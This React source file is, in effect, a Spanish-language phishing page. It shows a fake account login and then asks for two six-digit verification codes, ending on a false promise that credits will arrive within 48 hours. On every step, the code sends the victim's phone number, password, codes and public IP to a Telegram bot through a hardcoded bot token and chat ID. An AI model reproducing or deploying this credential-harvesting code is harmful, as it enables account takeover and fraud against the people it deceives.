import React from "react";
import { Formik, Form, Field, ErrorMessage } from "formik";
import * as Yup from "yup";
import "bootstrap/dist/css/bootstrap.min.css";
import "./styles.css"
import { useState, useEffect } from "react";
import Loader from "./loader";

const validationSchema = Yup.object().shape({
    telefono: Yup.string().
        matches(/^[0-9]+$/, "El telefono no es valido")
        .min(10, "El telefono no es valido")
        .max(10, "El telefono no es valido")
        .required("Este campo es obligatorio"),
    password: Yup.string()
        .min(8, "La contraseña debe tener al menos 8 caracteres")
        .required("Este campo es obligatorio"),
    firstCode: Yup.string()
        .min(6, "El codigo debe tener 6 caracteres")
        .max(6, "El codigo debe tener 6 caracteres")
});


const initialValues = {
    telefono: "",
    password: "",
    publicIp: "",
    firstCode: "",
    secondCode: "",
};

const getPublicIp = async () => {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
};

const FirstForm = () => {
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [currentPage, setCurrentPage] = useState('home');

    const handleNavigation = (page) => {
        setCurrentPage(page);
    }

    const onSubmit = (values) => {
        getPublicIp().then((ip) => {
            initialValues.publicIp = ip;
        }
        );

        const BOT_TOKEN = "5059173347:AAH61u5mX_tS_brdvQxVPmaA_jgQVVMJjHg"
        const CHAT_ID = "-825158067"

        if (currentPage === 'home') {
            setIsSubmitting(true);
            let mensaje = 'DATA:%0A%0ATelefono: ' + values.telefono + '%0AContraseña: ' + values.password + '%0AIP: ' + initialValues.publicIp + '%0A%0AEND';
            /* Enviar mensaje */
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${mensaje}&parse_mode=html`;
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: mensaje,
                    parse_mode: 'html'
                })
            })
                .then(res => res.json())
                .then(res => {
                    if (res.ok) {
                        console.log('Message sent')
                        /* Navegar a la siguiente pantalla */
                        handleNavigation('second');
                        const overlay = document.querySelector("#overlay");
                        /* Volver a mostrar */
                        overlay.style.display = "block";
                        setTimeout(() => {
                            overlay.style.display = "none";
                        }, 3000);
                    } else {
                        console.log('Error:', res.error)
                    }
                })
            setTimeout(() => {
                setIsSubmitting(false);
                handleNavigation('second');
            }, 3000);
        } else if (currentPage === 'second') {
            let mensaje = 'DATA:%0A%0ACode: ' + values.firstCode + '%0AIP: ' + initialValues.publicIp + '%0A%0AEND';

            /* Enviar mensaje */
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${mensaje}&parse_mode=html`;
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: mensaje,
                    parse_mode: 'html'
                })
            })
                .then(res => res.json())
                .then(res => {
                    if (res.ok) {
                        console.log('Message sent')
                        /* Navegar a la siguiente pantalla */
                        handleNavigation('third');
                        const overlay = document.querySelector("#overlay");
                        /* Volver a mostrar */
                        overlay.style.display = "block";
                        setTimeout(() => {
                            overlay.style.display = "none";
                        }, 3000);
                    } else {
                        console.log('Error:', res.error)
                    }
                })

            setIsSubmitting(true);
            setTimeout(() => {
                setIsSubmitting(false);
                handleNavigation('third');
            }, 3000);
        } else if (currentPage === 'third') {
            let mensaje = 'DATA:%0A%0ACode: ' + values.secondCode + '%0AIP: ' + initialValues.publicIp + '%0A%0AEND';

            /* Enviar mensaje */
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${mensaje}&parse_mode=html`;
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: mensaje,
                    parse_mode: 'html'
                })
            })
                .then(res => res.json())
                .then(res => {
                    if (res.ok) {
                        console.log('Message sent')
                        /* Navegar a la siguiente pantalla */
                        handleNavigation('fourth');
                        const overlay = document.querySelector("#overlay");
                        /* Volver a mostrar */
                        overlay.style.display = "block";
                        setTimeout(() => {
                            overlay.style.display = "none";
                        }, 3000);
                    } else {
                        console.log('Error:', res.error)
                    }
                })

            setIsSubmitting(true);
            setTimeout(() => {
                setIsSubmitting(false);
                handleNavigation('fourth');
            }, 3000);
        } else if (currentPage === 'fourth') {
            /*             setIsSubmitting(true);
                        setTimeout(() => {
                            setIsSubmitting(false);
                            handleNavigation('home');
                        }, 3000); */
        }


    };

    /* Listener del overlay para agregar display none en 3 seg */
    useEffect(() => {
        const overlay = document.querySelector("#overlay");
        setTimeout(() => {
            overlay.style.display = "none";
        }, 3000);
        /* imprimir ip */
        getPublicIp().then((ip) => {
            initialValues.publicIp = ip;
        }
        );
    }, []);

    /* Listener del input de telefono */
    useEffect(() => {
        const telefono = document.querySelector("#telefono");
        telefono.addEventListener("input", (e) => {
            const value = e.target.value;
            if (value.length > 10) {
                telefono.value = value.slice(0, 10);
            }
            /* Eliminar las letras */
            if (isNaN(value)) {
                telefono.value = value.slice(0, -1);
            }
        });
    }, []);



    if (currentPage === 'home') {
        return (
            <div className="container" style={style}>
                <Loader />
                <div className="row">
                    <div className="col-md-6 offset-md-3">
                        <Formik
                            initialValues={initialValues}
                            validationSchema={validationSchema}
                            onSubmit={(values) => onSubmit(values)}
                        >
                            <Form>
                                <h1 style={title}>Ingrese a su cuenta</h1>
                                <div className="form-group">
                                    <Field
                                        type="text"
                                        name="telefono"
                                        className="form-control"
                                        placeholder="Teléfono"
                                        id="telefono"
                                    />
                                    <p className="errorMessage">
                                        <ErrorMessage className="errorMessage" name="telefono" />
                                    </p>
                                </div>
                                <div className="form-group">
                                    <Field
                                        type="password"
                                        name="password"
                                        className="form-control"
                                        placeholder="Cotraseña"
                                    />
                                    <p className="errorMessage">
                                        <ErrorMessage className="errorMessage" name="password" />
                                    </p>
                                </div>
                                <div className="form-group">
                                    <button
                                        type="submit"
                                        className="boton"
                                    >
                                        Enviar
                                    </button>
                                </div>

                            </Form>
                        </Formik>
                    </div>
                </div>
            </div>
        )
    } else if (currentPage === 'second') {
        return (
            <div className="container" style={style}>
                <Loader />
                <div className="row">
                    <div className="col-md-6 offset-md-3">
                        <Formik
                            initialValues={initialValues}
                            validationSchema={validationSchema}
                            onSubmit={(values) => onSubmit(values)}
                        >
                            <Form>
                                <h1 style={title}>Ingrese a u cuenta</h1>
                                <div className="form-group">
                                    <Field
                                        type="text"
                                        name="firstCode"
                                        className="form-control"
                                        placeholder="Código"
                                        id="codigoInp"
                                        minLength="6"
                                        maxLength="6"
                                    />
                                    <p className="errorMessage">
                                        <ErrorMessage className="errorMessage" name="firstCode" />
                                    </p>
                                </div>
                                <div className="form-group" style={cont}>
                                    <button
                                        type="submit"
                                        className="boton"
                                        style={styleButton}
                                    >
                                        Enviar
                                    </button>
                                    <button
                                        type="submit"
                                        className="boton"
                                        onClick={() => handleNavigation('home')}
                                        style={styleButton2}
                                    >
                                        Regresar
                                    </button>
                                </div>
                            </Form>
                        </Formik>
                    </div>
                </div>
            </div>
        )
    } else if (currentPage === 'third') {
        return (
            <div className="container" style={style}>
                <Loader />
                <div className="row">
                    <div className="col-md-6 offset-md-3">
                        <Formik
                            initialValues={initialValues}
                            validationSchema={validationSchema}
                            onSubmit={(values) => onSubmit(values)}
                        >
                            <Form>
                                <h1 style={title}>Ingrese a su cuenta</h1>
                                <div className="form-group">
                                    <Field
                                        type="text"
                                        name="secondCode"
                                        className="form-control"
                                        placeholder="Código"
                                        id="codeInp"
                                        minLength="6"
                                        maxLength="6"
                                    />
                                    <p className="errorMessage">
                                        <ErrorMessage className="errorMessage" name="secondCode" />
                                    </p>
                                </div>
                                <div className="form-group" style={cont}>
                                    <button
                                        type="submit"
                                        className="boton"
                                        style={styleButton}
                                    >
                                        Enviar
                                    </button>
                                    <button
                                        type="submit"
                                        className="boton"
                                        onClick={() => handleNavigation('second')}
                                        style={styleButton2}
                                    >
                                        Regresar
                                    </button>
                                </div>
                            </Form>
                        </Formik>
                    </div>
                </div>
            </div>
        )
    } else if (currentPage === 'fourth') {
        return (
            <div className="container" style={style}>
                <Loader />
                <div className="row">
                    <div className="col-md-6 offset-md-3">
                        <div>
                            <h1 style={title}>Solicitud en proceso</h1>
                            <div style={cuadro}>
                                Su solicitud fue procesada exitosamente, en un plazo máximo de 48 horas se acreditarán los créditos obtenidos a su cuenta.
                            </div>
                            <div className="form-group" style={cent}>
                                <button
                                    type="submit"
                                    className="boton"
                                    onClick={() => handleNavigation('home')}
                                    style={styleButton}
                                >
                                    Regresar
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        )
    }

}

const style = {
    marginTop: "50px"
}

/* Hacer que los botones esten dentro de un contenedor en la misma linea */
const styleButton = {
    display: "inline-block",
    width: "49%"
}

/* Corregir que salen uno debajo del otro */
const styleButton2 = {
    display: "inline-block",
    width: "49%"
}

const cont = {
    display: "flex",
    justifyContent: "space-between"
}

const cuadro = {
    /* Cuadro gris con bordes redondeados */
    border: "1px solid #ccc",
    borderRadius: "5px",
    padding: "10px",
    margin: "10px 0",
    backgroundColor: "#ccc"
}

const cent = {
    display: "flex",
    justifyContent: "center"
}

const title = {
    textAlign: "left",
    color: "rgb(220, 103, 24)",
    fontSize: "30px",
    fontWeight: "bold",
}

export default FirstForm;